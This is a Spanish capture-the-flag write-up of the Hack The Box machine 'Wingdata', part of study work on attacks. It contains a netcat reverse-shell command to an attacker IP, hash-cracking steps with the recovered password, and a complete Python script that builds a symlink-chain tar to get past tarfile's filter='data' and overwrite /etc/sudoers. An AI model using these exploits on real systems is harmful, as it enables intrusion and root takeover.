# Wingdata — HTB (Writeup)

> **Autor:** Ángel de la Vega Cuevas
> **Objetivo:** Documentar el proceso de enumeración, explotación y escalada de privilegios en la máquina *Wingdata* de Hack The Box.

---

## Resumen

Durante la enumeración se identificó un servicio web asociado a **Wing FTP Server**. El servidor resultó vulnerable a **CVE-2025-47812**, una vulnerabilidad que permite ejecución remota de comandos sin autenticación mediante inyección de código Lua en archivos de sesión. La explotación permitió ejecutar comandos como `wingftp`, enumerar archivos de configuración internos, crackear credenciales, pivotar a `wacky` y escalar a root mediante un tar malicioso con cadena de symlinks anidados que bypassea el `filter="data"` de Python.

---

## 1) Descubrimiento

* **IP objetivo (lab):** `10.129.4.4` / `ftp.wingdata.htb`
* **OS detectado:** Linux
* **Servicios detectados:** HTTP (Wing FTP Server webadmin)

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.4.4 -oG allPorts
```

> El dominio `ftp.wingdata.htb` requiere resolución manual. Añadir al `/etc/hosts`:
> ```
> 10.129.4.4   ftp.wingdata.htb wingdata.htb
> ```

---

## 2) Enumeración

Accediendo al servicio HTTP en `http://ftp.wingdata.htb` se identificó visualmente que el servidor ejecuta **Wing FTP Server** — el nombre y versión aparecen reflejados en la interfaz web del cliente.

Investigando vulnerabilidades públicas se encontró **CVE-2025-47812**, que afecta a Wing FTP Server <= 7.4.3 y permite:

- Ejecución remota de comandos **sin autenticación**
- Inyección de código Lua en el parámetro `username` mediante **NULL byte injection**
- Ejecución automática del payload al acceder a `/dir.html`

---

## 3) Explotación (CVE-2025-47812)

### Cómo funciona la vulnerabilidad

Wing FTP Server expone un portal web para clientes. Al procesar el login, el parámetro `username` no sanea correctamente el carácter nulo (`%00`). Esto permite inyectar código **Lua** que queda escrito dentro del archivo de sesión del servidor. Cuando el servidor procesa la petición a `/dir.html`, ejecuta el contenido de esa sesión — incluyendo el código Lua inyectado — logrando **RCE sin autenticación**.

### PoC utilizado

```
https://github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData
```

Preparación del entorno:

```bash
python3 -m venv venv
source venv/bin/activate
pip install requests prompt_toolkit
```

Ejecución del exploit:

```bash
python3 exploit.py -u http://ftp.wingdata.htb
```

Salida obtenida:

```
[*] Targeting http://ftp.wingdata.htb
[*] Logging in with injected payload...
[*] Triggering payload...
[+] Target is vulnerable! Command output:
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),...
[+] Shell opened. Type 'exit' or Ctrl+C to quit.

Shell>
```

RCE confirmado como usuario `wingftp`.

---

## 4) Enumeración del sistema

Desde la `Shell>` del exploit:

```bash
id
# uid=1000(wingftp)

ls /opt/wftpserver
# Data  License.txt  Log  lua  session  session_admin  webadmin  webclient  wftpserver

cat /etc/passwd
# usuarios relevantes: wingftp, wacky, root
```

---

## 5) Reverse shell

La shell del exploit expira rápidamente (`session expired`) porque el script abre y cierra una sesión HTTP por cada comando. Para obtener una shell estable se usó netcat.

Listener en Kali:

```bash
nc -lvnp 4444
```

Payload ejecutado desde `Shell>`:

```bash
nc 10.10.16.140 4444 -e /bin/sh
```

Conexión recibida:

```
connect to [10.10.15.55] from (UNKNOWN) [10.129.4.4] 49738
```

Mejora de la shell para hacerla interactiva:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

> **Nota:** El payload `bash -i >& /dev/tcp/...` no funciona porque zsh no soporta `/dev/tcp`. Usar `nc` como alternativa.

---

## 6) Búsqueda de credenciales

Wing FTP Server almacena toda su configuración en `/opt/wftpserver/Data/`. Se exploró la estructura:

```bash
ls /opt/wftpserver/Data/
# 1  _ADMINISTRATOR  bookmark_db  settings.xml  ssh_host_ecdsa_key  ssh_host_key
```

### Hash del administrador del panel web

```bash
cat /opt/wftpserver/Data/_ADMINISTRATOR/admins.xml
```

```xml
<Admin_Name>admin</Admin_Name>
<Password>a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba</Password>
```

El panel admin corre en el **puerto 5466** (detectado en `settings.xml`), pero no es accesible externamente.

### Usuarios FTP del servidor

```bash
ls /opt/wftpserver/Data/1/users/
# anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml

cat /opt/wftpserver/Data/1/users/wacky.xml
```

```xml
<UserName>wacky</UserName>
<Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
```

---

## 7) Crackeo del hash (wacky)

El hash está en formato `sha256($pass.$salt)` donde el salt es la cadena fija **`WingFTP`** (no el nombre de usuario).

```bash
echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > hash.txt
hashcat -m 1410 hash.txt rockyou.txt
```

Resultado:

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
Status: Cracked
```

| Usuario | Contraseña |
|---------|-----------|
| `wacky` | `!#7Blushing^*Bride5` |

> **Nota:** El salt correcto es la cadena literal `WingFTP` con mayúsculas exactas — es un valor fijo hardcodeado en el software. Intentar con el username como salt agota rockyou sin resultado.

---

## 8) Acceso como wacky

Pivotando desde la shell de `wingftp`:

```bash
su wacky
# Password: !#7Blushing^*Bride5
```

O directamente por SSH:

```bash
ssh wacky@10.129.4.4
cat ~/user.txt
# 219e48141455a245455e74fe2aacf9c3
```

---

## 9) Escalada de privilegios (tar symlink chain bypass)

### Enumeración de sudo

```bash
sudo -l
```

```
User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

`wacky` puede ejecutar como root un script Python que extrae archivos `.tar` usando `tarfile.extractall()` con `filter="data"`.

### ¿Qué es filter="data" y por qué no es suficiente?

`filter="data"` es una protección introducida en Python 3.12 para que `tarfile.extractall()` no pueda escribir fuera del directorio destino. En teoría bloquea:

- Symlinks con rutas absolutas (`/etc/sudoers`)
- Path traversal directo (`../../etc/sudoers`)
- Hardlinks a rutas fuera del destino

Sin embargo, **no bloquea cadenas de symlinks suficientemente profundas y anidadas** que superen el límite de resolución de rutas del kernel. Cada symlink individual parece relativo y válido, pero la cadena completa acaba apuntando fuera del directorio permitido. Este es el vector de explotación.

### Cómo funciona el script exploit

El script construye un tar con la siguiente cadena de engaños:

**Paso 1 — Directorios con nombres larguísimos**
Se crean directorios con nombres de 247 caracteres (`ddd...d`). Esto genera rutas extremadamente largas que saturan los límites internos del kernel al resolver symlinks.

**Paso 2 — Cadena de symlinks intermedios**
Por cada letra de `steps` (`a`, `b`, `c`...) se crea un symlink que apunta al directorio largo. Esto genera una cadena de redirecciones en cascada.

**Paso 3 — Symlink de escape hacia la raíz**
Un symlink con nombre de 254 caracteres `l` apunta hacia arriba con `../` repetidos tantas veces como pasos hay, llegando efectivamente a `/`.

**Paso 4 — Symlink `escape` apuntando a /etc**
Usando la cadena anterior como base, se crea `escape` que resuelve a `/etc`.

**Paso 5 — Hardlink `sudoers_link`**
Apunta a `escape/sudoers`, que a través de toda la cadena resuelve a `/etc/sudoers`.

**Paso 6 — Archivo regular `sudoers_link`**
Contiene la entrada maliciosa. Al extraerse, el kernel sigue la cadena completa y escribe el contenido en `/etc/sudoers`.

```python
import tarfile
import os
import io

comp = 'd' * 247
steps = "abcdefghijklmnop"
path = ""

with tarfile.open("/tmp/backup_9999.tar", mode="w") as tar:
    for i in steps:
        # Directorio con nombre largo para saturar límites del kernel
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)

        # Symlink intermedio de la cadena
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)

        path = os.path.join(path, comp)

    # Symlink que sube hasta la raíz con ../ repetidos
    linkpath = os.path.join("/".join(steps), "l" * 254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = "../" * len(steps)
    tar.addfile(l)

    # Symlink escape → /etc (usando la cadena anterior)
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../../../../etc"
    tar.addfile(e)

    # Hardlink a escape/sudoers → /etc/sudoers
    f = tarfile.TarInfo("sudoers_link")
    f.type = tarfile.LNKTYPE
    f.linkname = "escape/sudoers"
    tar.addfile(f)

    # Contenido malicioso que sobreescribe /etc/sudoers
    content = b"wacky ALL=(ALL) NOPASSWD: ALL\n"
    c = tarfile.TarInfo("sudoers_link")
    c.type = tarfile.REGTYPE
    c.size = len(content)
    tar.addfile(c, fileobj=io.BytesIO(content))

print("[+] Exploit created")
```

### Ejecución

```bash
# Crear el tar malicioso
python3 exploit_cve.py

# Copiarlo al directorio de backups (wacky tiene permisos de escritura)
cp /tmp/backup_9999.tar /opt/backup_clients/backups/

# Ejecutar el script como root
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_evil
```

Salida:

```
[+] Backup: backup_9999.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_evil
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_evil
```

### Resultado

```bash
sudo -l
# User wacky may run the following commands: (ALL) NOPASSWD: ALL

sudo cat /root/root.txt
# 8e437eca8b9a600883d4f89c0022913b
```

---

## 10) Flags

| Flag | Hash |
|------|------|
| `user.txt` | `219e48141455a245455e74fe2aacf9c3` |
| `root.txt` | `8e437eca8b9a600883d4f89c0022913b` |

---


## 11) Notas técnicas

- La shell del exploit es temporal — cada comando abre y cierra una sesión HTTP, provocando `session expired` frecuentes.
- El salt del hash de Wing FTP Server es la cadena fija `WingFTP`, no el nombre de usuario — error común al intentar crackearlo.
- El panel admin corre en el puerto **5466** pero no es accesible externamente sin port forwarding (chisel o SSH tunnel).
- `filter="data"` en Python 3.12 no es suficiente para proteger `tarfile.extractall()` contra cadenas de symlinks suficientemente profundas — este bypass es el núcleo de la escalada.
- El exploit **debe ejecutarse como `wacky`**, no como `wingftp` — solo `wacky` tiene permisos sudo sobre el script de backup.
